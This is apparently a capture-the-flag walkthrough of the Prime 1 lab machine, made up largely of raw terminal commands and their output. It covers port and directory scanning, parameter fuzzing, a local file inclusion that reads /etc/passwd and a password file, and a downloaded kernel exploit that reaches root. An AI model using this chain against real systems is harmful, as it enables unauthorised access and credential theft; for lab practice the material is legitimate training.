https://lifesfun101.github.io/2019/09/15/Prime_1-walkthrough.html


└─$ sudo nmap -A -T5 -p- 192.168.53.128
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-04 07:19 CEST
Nmap scan report for 192.168.53.128
Host is up (0.00011s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)
|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)
|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: HacknPentest
MAC Address: 00:0C:29:EB:A5:7C (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



└─$ dirb http://192.168.53.128 -X .php,.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Apr  5 07:45:44 2021
URL_BASE: http://192.168.53.128/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.php,.txt) | (.php)(.txt) [NUM = 2]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.53.128/ ----
+ http://192.168.53.128/image.php (CODE:200|SIZE:147)                                                          
+ http://192.168.53.128/index.php (CODE:200|SIZE:136)                                                          
+ http://192.168.53.128/secret.txt (CODE:200|SIZE:412)  



└─$ curl -s http://192.168.53.128/dev   
hello,

now you are at level 0 stage.

In real life pentesting we should use our tools to dig on a web very hard.

Happy hacking. 



[+] victor
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)



└─$ nikto -h http://192.168.53.128                 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.53.128
+ Target Hostname:    192.168.53.128
+ Target Port:        80
+ Start Time:         2021-04-04 07:34:23 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2021-04-04 07:35:11 (GMT2) (48 seconds)



└─$ gobuster dir -u http://192.168.53.128 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.53.128
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2021/04/04 07:44:59 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 320] [--> http://192.168.53.128/wordpress/]
/dev                  (Status: 200) [Size: 131]                                       
/javascript           (Status: 301) [Size: 321] [--> http://192.168.53.128/javascript/]
/secret.txt           (Status: 200) [Size: 412]                                        
/server-status        (Status: 403) [Size: 302]                                        
                                                        

└─$ curl http://192.168.53.128/dev                                                                          7 ⨯
curl: (7) Failed to connect to 192.168.53.128 port 80: Connection refused



└─$ curl http://192.168.53.128/secret.txt 
Looks like you have got some secrets.

Ok I just want to do some help to you. 

Do some more fuzz on every page of php which was finded by you. And if
you get any right parameter then follow the below steps. If you still stuck 
Learn from here a basic tool with good usage for OSCP.

https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web
 


//see the location.txt and you will get your next move//


└─$ wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404  http://192.168.53.128/index.php?FUZZ=something 

└─$ wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hh 136   http://192.168.53.128/index.php?FUZZ=something

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.53.128/index.php?FUZZ=something
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                        
=====================================================================

000000341:   200        7 L      19 W       206 Ch      "file"                                         

Total time: 0.439852
Processed Requests: 951
Filtered Requests: 950
Requests/sec.: 2162.089


└─$ curl http://192.168.53.128/index.php?file=location.txt
<html>
<title>HacknPentest</title>
<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" />
</body>

Do something better <br><br><br><br><br><br>ok well Now you reah at the exact parameter <br><br>Now dig some more for next one <br>use 'secrettier360' parameter on some other php page for more fun.
</html>



└─$ wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hh 197   http://192.168.53.128/image.php?secrettier360=FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.53.128/image.php?secrettier360=FUZZ
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                        
=====================================================================

000000257:   200        13 L     43 W       328 Ch      "dev"                                          

Total time: 0.581366
Processed Requests: 951
Filtered Requests: 950
Requests/sec.: 1635.802


└─$ curl http://192.168.53.128/image.php?secrettier360=dev
<html>
<title>HacknPentest</title>
<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
</body>
finaly you got the right parameter<br><br><br><br>hello,

now you are at level 0 stage.

In real life pentesting we should use our tools to dig on a web very hard.

Happy hacking. 
</html>



└─$ curl http://192.168.53.128/image.php?secrettier360=php://filter/convert.base64-encode/resource=image.php
<html>
<title>HacknPentest</title>
<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
</body>
finaly you got the right parameter<br><br><br><br>PGh0bWw+Cjx0aXRsZT5IYWNrblBlbnRlc3Q8L3RpdGxlPgo8Ym9keT4KIDxpbWcgc3JjPSdoYWNrbnBlbnRlc3QucG5nJyBhbHQ9J2hucCBzZWN1cml0eScgd2lkdGg9IjEzMDAiIGhlaWdodD0iNTk1IiAvPjwvcD48L3A+PC9wPgo8L2JvZHk+Cjw/cGhwCiRzZWNyZXQgPSAkX0dFVFsnc2VjcmV0dGllcjM2MCddOwppZihpc3NldCgkc2VjcmV0KSkKCnsKIGVjaG8iZmluYWx5IHlvdSBnb3QgdGhlIHJpZ2h0IHBhcmFtZXRlciI7CiBlY2hvICI8YnI+PGJyPjxicj48YnI+IjsKIGluY2x1ZGUoIiRzZWNyZXQiKTsKCn0KCj8+CjwvaHRtbD4K</html>
                                                                                                                
┌──(kali㉿kali)-[~]
└─$ echo -ne 'PGh0bWw+Cjx0aXRsZT5IYWNrblBlbnRlc3Q8L3RpdGxlPgo8Ym9keT4KIDxpbWcgc3JjPSdoYWNrbnBlbnRlc3QucG5nJyBhbHQ9J2hucCBzZWN1cml0eScgd2lkdGg9IjEzMDAiIGhlaWdodD0iNTk1IiAvPjwvcD48L3A+PC9wPgo8L2JvZHk+Cjw/cGhwCiRzZWNyZXQgPSAkX0dFVFsnc2VjcmV0dGllcjM2MCddOwppZihpc3NldCgkc2VjcmV0KSkKCnsKIGVjaG8iZmluYWx5IHlvdSBnb3QgdGhlIHJpZ2h0IHBhcmFtZXRlciI7CiBlY2hvICI8YnI+PGJyPjxicj48YnI+IjsKIGluY2x1ZGUoIiRzZWNyZXQiKTsKCn0KCj8+CjwvaHRtbD4K' | base64 -d
<html>
<title>HacknPentest</title>
<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
</body>
<?php
$secret = $_GET['secrettier360'];
if(isset($secret))

{
 echo"finaly you got the right parameter";
 echo "<br><br><br><br>";
 include("$secret");

}

?>
</html>

curl http://192.168.53.128/image.php?secrettier360=/etc/passwd | sed -e '6,$!d' | sed 's/finaly you got the right parameter<br><br><br><br>//' | sed '$d'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
saket:x:1001:1001:find password.txt file in my directory:/home/saket:
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin

└─$ curl http://192.168.53.128/image.php?secrettier360=/home/saket/password.txt | sed -e '6,$!d' | sed 's/finaly you got the right parameter<br><br><br><br>//' | sed '$d'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   215  100   215    0     0  71666      0 --:--:-- --:--:-- --:--:-- 71666
follow_the_ippsec



http://192.168.53.128/wordpress/wp-content/themes/twentynineteen/secret.php


$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ uname -a
Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux


www-data@ubuntu:/tmp$ cat /opt/backup/server_database/backup_pass
cat /opt/backup/server_database/backup_pass
your password for backup_database file enc is 

"backup_password"


Enjoy!

www-data@ubuntu:/home/saket$ cat key.txt
cat key.txt
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.


www-data@ubuntu:/home/saket$ cat enc.txt
cat enc.txt
nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=


The MD5 hash of:
ippsec
is:
366a74cb3c959de17d61db30591c39d1
3336366137346362336339353964653137643631646233303539316333396431

$ echo "nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4="  | base64 -d | openssl enc -aes-256-ecb -d -a -K 366a74cb3c959de17d61db30591c39d1


└─$ echo -ne 'ippsec' | md5sum

366a74cb3c959de17d61db30591c39d1  -


www-data@ubuntu:/home/saket$ echo ippsec | md5sum
echo ippsec | md5sum
6210ff70fb143e19111c6166a185a3d8  -



www-data@ubuntu:/var/www/html$ cat /proc/version

─$ searchsploit ubuntu 16.04.4
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                              | linux/local/44298.c

└─$ wget https://www.exploit-db.com/download/45010                                            

www-data@ubuntu:~$ gcc 45010.c -o 45010
www-data@ubuntu:~$ ./45010

id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
cat /root/root.txt
b2b17036da1de94cfb024540a8e7075a
